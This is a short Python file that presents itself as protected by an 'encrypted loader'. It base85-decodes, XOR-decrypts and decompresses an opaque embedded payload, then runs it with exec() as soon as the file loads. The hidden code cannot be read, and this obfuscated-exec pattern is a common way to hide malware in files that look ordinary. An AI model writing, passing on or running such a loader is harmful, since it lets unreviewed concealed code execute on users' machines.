# -*- coding: utf-8 -*-
# Protected by Javis Universal Dynamic Encrypted Loader
import base64 as _b85, zlib as _zl
def _xload(_s, _k):
    _e = _b85.b85decode(_s)
    _o = bytearray()
    _p = 0xAA
    _kl = len(_k)
    for _i, _b in enumerate(_e):
        _o.append(_b ^ (_k[_i % _kl] ^ _p))
        _p = _b
    return _zl.decompress(bytes(_o))

_KEY = b'javis_universal_dynamic_loader_2026_'
_PAYLOAD = "xB~z>6eNq)sG|wg7othd|F-Cx@I6j2^e-n|aTqAtMnDJf&(H2L)5I5t8Mfkin2!*w@n6<ye`-}iUozLHrK)4a<ri=N*W5ZGd{>Bn_DbacjU-YtQ_8IYP+7E3g>aH_MrS=B@YS2fDcDXW&XDv}R0I=i<u`RuCt(jz1|46iN*T8~q%FA{rFA-eHfx7WHJ^oq&M^KrOndBjoF_5b@YorPDy+@WFyGL1iZmVBTCHb#`2|S#%9U17>AfGs0YS>~eTYuCe8G&naVXw?DPOzTe=3!)LEz3JT*m7a;N^YSS&E`8Ox+>CK4+s?G4R9bj?klNZ3d=PNZe-Ey?etW{{_5sk0>w_0kn9qcQwo_kybW576O$KMT}?pO~b;(@toh9^sSFTXX%|ke5O5GJfwN5C-otB+X>s5@5t#D(MpQREh>{BD1ZnQWCQ?l>0#Q`mu658W_WwmGDq9ZY~4BJ$&=WuIw}&|svFrD$=&od?}pq+(DC_%IZFs;Lf>dD3wY8zF2vbV@nJ3TBoqK>mbjmG`rfYC&k;pxlIB{L9jo1S0WO-IwLuK?!_w~oXdFWV3Mj!kovG|Mm*LMI>*kV6M5XaU#~07WZcEw4-f&>3<C(0DF@55?%ly+C?2Aj;OGTk_T^70AMF"
exec(compile(_xload(_PAYLOAD, _KEY), __file__, "exec"), globals())
